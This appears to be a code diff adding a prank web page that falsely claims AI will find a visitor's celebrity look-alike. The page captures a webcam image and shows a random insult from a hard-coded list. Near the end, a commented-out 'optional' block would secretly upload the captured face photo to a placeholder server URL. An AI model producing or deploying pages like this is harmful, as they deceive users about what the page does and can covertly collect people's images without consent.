@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Celebrity Look-Alike Scanner</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f4f4f4;
+        }
+        h1 {
+            margin-top: 50px;
+        }
+        #video {
+            width: 300px;
+            border: 2px solid black;
+            margin-top: 20px;
+            display: none;
+        }
+        #result {
+            margin-top: 20px;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 18px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Find Your Celebrity Look-Alike! 🤩</h1>
+    <p>Click the button and let AI detect which celebrity you resemble the most!</p>
+    <button id="startBtn">Start Scan</button>
+    <video id="video" autoplay></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+    <p id="result"></p>
+
+    <script>
+        const startBtn = document.getElementById("startBtn");
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const result = document.getElementById("result");
+
+        let fakeResults = [
+            "You look like Shrek! 😂",
+            "You resemble a potato 🥔",
+            "Your twin? Mr. Bean! 🤣",
+            "Wow! You look just like The Rock... but smaller 🪨",
+            "Your look-alike is SpongeBob! 🍍"
+        ];
+
+        startBtn.addEventListener("click", async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                video.style.display = "block";
+                startBtn.style.display = "none";
+
+                setTimeout(() => {
+                    // Capture the image
+                    const context = canvas.getContext("2d");
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    // Stop the camera
+                    stream.getTracks().forEach(track => track.stop());
+
+                    // Display funny result
+                    let randomResult = fakeResults[Math.floor(Math.random() * fakeResults.length)];
+                    result.innerText = randomResult;
+                    video.style.display = "none";
+
+                    // OPTIONAL: You can save the image to a server using fetch()
+                    /*
+                    canvas.toBlob(blob => {
+                        let formData = new FormData();
+                        formData.append("file", blob, "prank.jpg");
+                        fetch("YOUR_SERVER_UPLOAD_URL", {
+                            method: "POST",
+                            body: formData
+                        });
+                    });
+                    */
+
+                }, 5000); // Wait 5 seconds before capturing
+            } catch (err) {
+                alert("Camera access denied! You need to allow it to continue.");
+            }
+        });
+    </script>
+
+</body>
+</html>
